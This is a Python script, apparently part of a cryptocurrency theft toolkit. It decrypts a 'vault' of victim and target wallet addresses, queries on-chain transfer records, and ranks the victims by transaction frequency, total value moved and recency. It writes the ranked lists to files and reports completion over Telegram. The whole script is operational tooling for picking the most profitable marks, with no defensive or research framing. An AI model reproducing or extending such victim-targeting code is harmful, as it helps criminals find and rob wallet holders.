#!/usr/bin/env python3
"""
Rank victims from vault.txt by their on‑chain activity.
Reads vault.txt, queries the database, and sorts by:
  1. Interaction frequency (most frequent first)
  2. Total amount transferred (largest first)
  3. Most recent block (latest first)

Outputs:
  - ranked_victims.txt   – detailed table (TSV)
  - ranked_addresses.txt – just the addresses, one per line, in ranked order

Multi‑chain: if CHAIN is set (other than 'ethereum'), output filenames include the chain suffix.
"""

import os
import re
import sys
import psycopg2
from psycopg2.extras import RealDictCursor

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lib.config import config
from lib.logger import logger
from lib.retry import retry
from lib.notifier import send_telegram
from lib.shutdown import setup_graceful_shutdown
from lib.encryption import decrypt

# --- Multi‑chain: get current chain ---
CHAIN = getattr(config, 'CHAIN', 'ethereum')
chain_cfg = config.get_chain_config() if hasattr(config, 'get_chain_config') else None
NATIVE_SYMBOL = chain_cfg['native_symbol'] if chain_cfg and 'native_symbol' in chain_cfg else 'ETH'

# --- Config ---
VAULT_FILE = config.VAULT_FILE
# Add chain suffix to output files if chain is not 'ethereum'
chain_suffix = f"_{CHAIN}" if CHAIN != 'ethereum' else ""
RANKED_ADDRESSES_FILE = config.RANKED_ADDRESSES_FILE or f"ranked_addresses{chain_suffix}.txt"
RANKED_DETAILS_FILE = config.RANKED_DETAILS_FILE or f"ranked_victims{chain_suffix}.txt"

logger.info(f"Ranking victims on chain: {CHAIN} ({NATIVE_SYMBOL})")

# Database credentials from config
DB_USER = config.db['user']
DB_HOST = config.db['host']
DB_NAME = config.db['database']
DB_PASSWORD = config.db['password']
DB_PORT = config.db['port']

# --- Helpers ---
def get_victims_from_vault(vault_path):
    """Extract victim addresses from vault.txt (new format)."""
    victims = []
    if not os.path.exists(vault_path):
        logger.error(f"{vault_path} not found.")
        return victims
    with open(vault_path, 'r') as f:
        for raw_line in f:
            line = raw_line.strip()
            if not line:
                continue
            try:
                decrypted_line = decrypt(line)
            except Exception as e:
                logger.error(f"Failed to decrypt line: {e}")
                continue

            match = re.search(r'Victim:\s*(0x[a-fA-F0-9]{40})', decrypted_line, re.IGNORECASE)
            if match:
                victims.append(match.group(1).lower())
            else:
                match = re.search(r'Target:\s*(0x[a-fA-F0-9]{40})', decrypted_line, re.IGNORECASE)
                if match:
                    victims.append(match.group(1).lower())
    return list(set(victims))

@retry(max_attempts=3, base_delay=1, exceptions=(Exception,))
def fetch_victim_stats(victim_addresses, conn):
    if not victim_addresses:
        return []
    placeholders = ','.join(['%s'] * len(victim_addresses))
    query = f"""
        SELECT
            sender,
            COUNT(*) AS frequency,
            SUM(value::NUMERIC) AS total_amount,
            MAX(block_number) AS last_block
        FROM token_transfers
        WHERE sender IN ({placeholders})
        GROUP BY sender
        ORDER BY frequency DESC, total_amount DESC, last_block DESC
    """
    with conn.cursor(cursor_factory=RealDictCursor) as cur:
        cur.execute(query, victim_addresses)
        rows = cur.fetchall()
    return rows

def main():
    setup_graceful_shutdown()

    victims = get_victims_from_vault(VAULT_FILE)
    if not victims:
        logger.error("No victims found in vault.txt")
        sys.exit(1)

    logger.info(f"Found {len(victims)} unique victims in vault.txt")

    try:
        conn = psycopg2.connect(
            user=DB_USER,
            host=DB_HOST,
            database=DB_NAME,
            password=DB_PASSWORD,
            port=DB_PORT
        )
    except Exception as e:
        logger.error(f"DB connection error: {e}")
        sys.exit(1)

    stats = fetch_victim_stats(victims, conn)
    conn.close()

    if not stats:
        logger.error("No stats found for these victims")
        sys.exit(1)

    # --- Write detailed TSV ---
    with open(RANKED_DETAILS_FILE, "w") as f:
        f.write("Rank\tVictim\tFrequency\tTotalAmount\tLastBlock\n")
        for i, row in enumerate(stats, 1):
            f.write(f"{i}\t{row['sender']}\t{row['frequency']}\t{row['total_amount']}\t{row['last_block']}\n")
    logger.info(f"Detailed ranking saved to {RANKED_DETAILS_FILE}")

    # --- Write just the addresses (in order) ---
    with open(RANKED_ADDRESSES_FILE, "w") as f:
        for row in stats:
            f.write(row['sender'] + "\n")
    logger.info(f"Ranked addresses saved to {RANKED_ADDRESSES_FILE}")

    # --- Also print to console ---
    print("\n[+] Ranking (top 20):\n")
    print(f"{'#':<4} {'Victim Address':<44} {'Freq':<8} {'Total Amount':<18} {'Last Block':<12}")
    print("-" * 90)
    for i, row in enumerate(stats[:20], 1):
        addr = row['sender']
        freq = row['frequency']
        total = float(row['total_amount'])
        total_display = f"{total:,.0f}"
        last_block = row['last_block']
        print(f"{i:<4} {addr:<44} {freq:<8} {total_display:<18} {last_block:<12}")

    # Send completion alert
    send_telegram(f"📊 Ranking complete\nChain: {CHAIN}\nRanked {len(stats)} victims")

if __name__ == "__main__":
    main()